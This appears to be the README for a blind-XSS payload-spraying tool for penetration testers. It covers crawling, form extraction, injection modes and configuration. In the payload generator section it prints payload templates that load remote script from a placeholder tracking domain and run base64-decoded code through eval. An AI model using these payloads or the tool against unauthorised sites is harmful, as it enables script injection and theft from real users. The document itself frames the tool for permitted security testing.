# XSSpecter - XSS Payload Spraying CLI Tool

XSSpecter is a command-line interface (CLI) utility designed for penetration testers to ethically **spray** various Cross-Site Scripting (XSS) payloads across web targets. It automates crawling, form and link extraction, payload generation, injection via GET/POST (including multipart), and results export.

---

## Table of Contents
1. [Overview](#overview)
2. [Ethical Notice & Disclaimer](#ethical-notice--disclaimer)
3. [Key Features](#key-features)
4. [Architecture & Modules](#architecture--modules)
5. [Installation](#installation)
6. [Configuration](#configuration)
7. [Usage](#usage)
   - [spray Command](#spray-command)
   - [Options & Flags](#options--flags)
   - [Examples](#examples)
8. [Execution Flow](#execution-flow)
9. [Extending & Customizing](#extending--customizing)
10. [Contributing & License](#contributing--license)

---

## Overview

XSSpecter streamlines the process of injecting XSS payloads by:
- Optionally crawling a target domain to discover pages and forms
- Parsing forms (`<form>` tags) and query-based GET parameters
- Generating unique, trackable XSS payloads
- Spraying payloads via GET, POST (urlencoded), and multipart/form-data
- Exporting scan results to JSON for analysis

It leverages Python libraries including [requests](https://pypi.org/project/requests/), [BeautifulSoup](https://pypi.org/project/beautifulsoup4/), and [Typer](https://pypi.org/project/typer/) for CLI.

## Ethical Notice & Disclaimer

> **Warning:** Use XSSpecter **only** on applications and domains for which you have explicit permission to test. Unauthorized scanning, injection, or exploitation is illegal and unethical. Always adhere to your organization's rules of engagement and applicable laws.

## Key Features
- **Crawling:** Configurable depth and max pages, domain-restricted, concurrent threads
- **Form & Link Extraction:** HTML parsing to locate `<form>` elements and GET-parameterized links
- **Payload Generation:** Unique IDs, base64-encoded scripts/styles, server-side tracking via API
- **Spraying Mechanisms:** GET requests (query injection), POST urlencoded, multipart uploads
- **Progress & Reporting:** Rich console progress bars, colored status outputs, JSON export
- **Customizable:** Headers, cookies, proxy, SSL ignore, thread count

## Architecture & Modules

```text
project_root/
├── xsspecter/           # CLI entry point
│   └── main.py          # Typer-based CLI: `xsspecter http://target/ --crawl ...`
├── modules/             # Core functionality modules
│   ├── config.py        # Load/save config (~/.config/xsspecter/config.json)
│   ├── web_crawler.py   # Domain-limited crawler, HTML fetch, concurrency
│   ├── html_parser.py   # Parse HTML, extract forms and GET-parameter links
│   ├── form_processor.py# Normalize `<form>` details to uniform data model
│   ├── payload_generator.py # Generate/track unique XSS payloads
│   ├── payload_spray.py # Send payloads via GET/POST/multipart
│   └── result_exporter.py # Export results to JSON file
├── requirements.txt     # Dependencies pinning
└── setup.py             # Package metadata
```

### Module Responsibilities
- **config.py**: Manages default values (`IGNORE_KEYS`, default emails/numbers), loads/saves user config at `~/.config/xsspecter/config.json`.
- **web_crawler.py**: Implements `WebCrawler` with methods:
  - `crawl()`: breadth-first queue with thread pool, depth and page limits
  - `_process_url()`: fetch page, extract forms, record metadata, discover links
- **html_parser.py**: `HTMLParser` wraps BS4 to:
  - Find `<form>` tags, pass to `FormProcessor`
  - Find `<a>` links with query parameters as pseudo-forms
- **form_processor.py**: `FormProcessor` normalizes inputs, textareas, selects into:
  ```json
  { url, method, data: { name: { value, type } }, content_type }
  ```
- **payload_generator.py**: `PayloadGenerator` posts a tracking payload to a remote server, generates payload templates:
  ```js
  ""><script src="//DOMAIN/UID"></script>
  ""><style/onload=import("//DOMAIN/UID")></style>
  ... onfocus=eval(atob(this.id))
  ```
- **payload_spray.py**: `PayloadSpray.run()` chooses GET vs POST, urlencoded vs multipart, attaches payload into fields or headers.
- **result_exporter.py**: Serializes `crawler.results` into JSON file.

## Installation

```bash
# Clone or install via pipx (recommended):
pipx install "git+https://github.com/your-org/xsspecter.git"

# Or install in a virtualenv:
git clone https://github.com/your-org/xsspecter.git
cd xsspecter
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
pip install .
```

## Configuration

- Default config path: `~/.config/xsspecter/config.json`
- Fields:
  - `domain`: Your tracking domain (e.g. `dnslog-server.com`)
  - `api_key`: API token for payload tracking
  - `max_depth`: Default crawl depth
  - `rate_limit`: Requests per second (reserved)

_On first run, an empty template is generated. Fill in `domain` and `api_key` before payloads will work._

## Usage

### spray Command
```bash
xsspecter [OPTIONS] <url>
```

#### Options & Flags
- `--depth INT`           : Maximum crawl depth (default: 2)
- `--max-pages INT`       : Max pages to crawl (default: 100)
- `--output PATH`         : Output JSON file (default: results.json)
- `--crawl / --no-crawl`  : Enable or disable crawling (default: disabled)
- `--proxy TEXT`          : HTTP proxy (e.g. http://user:pass@host:port)
- `--insecure`            : Ignore SSL warnings (insecure)
- `--headers key:val`     : Custom HTTP header (repeatable)
- `--cookies "k1=v1;k2=v2"`: Custom cookies
- `--threads INT`         : Number of concurrent threads (default: 5)

### Examples
- **Simple spray without crawling**
  ```bash
  xsspecter https://target.com/login 
  ```

- **Full crawl + spray**
  ```bash
  xsspecter https://target.com --crawl --depth 3 --max-pages 50
  ```

## Execution Flow
1. **Validate URL** using `validators.url`
2. **Initialize** `WebCrawler` and (optionally) **crawl** pages:
   - Fetch pages via `requests.Session`
   - Extract `<form>` and GET-link targets
   - Record page metadata (title, meta description, status code)
3. **Generate Payloads** per form/link with `PayloadGenerator`:
   - Register tracking info to remote API
   - Create unique, encoded payload strings
4. **Spray Payloads** with `PayloadSpray`:
   - GET: append query string and override `User-Agent`
   - POST urlencoded: form body + custom headers
   - POST multipart: file fields + form fields
5. **Log & Display** HTTP status per injection
6. **Export Results** to JSON via `ResultExporter.export_json`

## Extending & Customizing
- **Add new payload templates**: modify `modules/payload_generator.py`
- **Ignore additional fields**: update `Config.IGNORE_KEYS` in `modules/config.py`
- **Enhance form parsing**: extend `FormProcessor.process()` in `modules/form_processor.py`
- **Support new content types**: extend `PayloadSpray.run()` in `modules/payload_spray.py`

## Contributing & License
- Contributions via Issues & PRs welcome.
- Fork the repo, create a branch, submit a pull request.
- **License**: No license file included by default; consider adding MIT or Apache-2.0 before production use.
